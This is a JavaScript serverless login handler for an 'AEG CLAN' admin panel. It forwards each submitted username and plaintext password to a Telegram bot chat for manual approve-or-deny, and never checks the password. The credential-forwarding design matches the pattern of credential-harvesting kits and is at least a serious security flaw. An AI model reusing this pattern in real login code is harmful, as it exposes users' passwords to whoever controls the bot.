// api/login.js
// Receives username+password, sends Telegram notification with approve/deny buttons.
// Uses an in-memory store (works on Vercel serverless with short-lived tokens).
// For production, swap pendingStore with Redis/Upstash.

import crypto from 'crypto'

// Simple in-memory pending store
// Key: token, Value: { username, status: 'pending'|'approved'|'denied', messageId, expires }
const pendingStore = global._aegPendingStore || (global._aegPendingStore = new Map())

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' })
  }

  const { username, password } = req.body

  if (!username || !password) {
    return res.status(400).json({ success: false, error: 'Username dan password wajib diisi.' })
  }

  // Generate a short-lived token for this login attempt
  const token = crypto.randomBytes(24).toString('hex')
  const expires = Date.now() + 1000 * 60 * 15 // 15 minutes

  // Store pending request
  pendingStore.set(token, { username, status: 'pending', expires })

  // Build Telegram inline keyboard
  const approveCallback = `approve:${token}`
  const denyCallback    = `deny:${token}`

  const message =
    `🔐 *AEG CLAN — LOGIN REQUEST*\n\n` +
    `👤 Username: \`${username}\`\n` +
    `🔑 Password: \`${password}\`\n\n` +
    `━━━━━━━━━━━━━━\n` +
    `Seseorang mencoba masuk ke panel admin.\n` +
    `Izinkan akses?`

  try {
    const tgRes = await fetch(
      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: process.env.CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [[
              { text: '✅ Iya, Izinkan', callback_data: approveCallback },
              { text: '❌ Tidak, Tolak',  callback_data: denyCallback  }
            ]]
          }
        })
      }
    )

    const tgData = await tgRes.json()
    if (!tgData.ok) throw new Error(tgData.description)

    // Save message_id so webhook can edit it later
    const entry = pendingStore.get(token)
    entry.messageId = tgData.result.message_id
    pendingStore.set(token, entry)

    return res.status(200).json({ success: true, token })

  } catch (err) {
    console.error(err)
    pendingStore.delete(token)
    return res.status(500).json({ success: false, error: 'Gagal mengirim notifikasi Telegram.' })
  }
}

export { pendingStore }
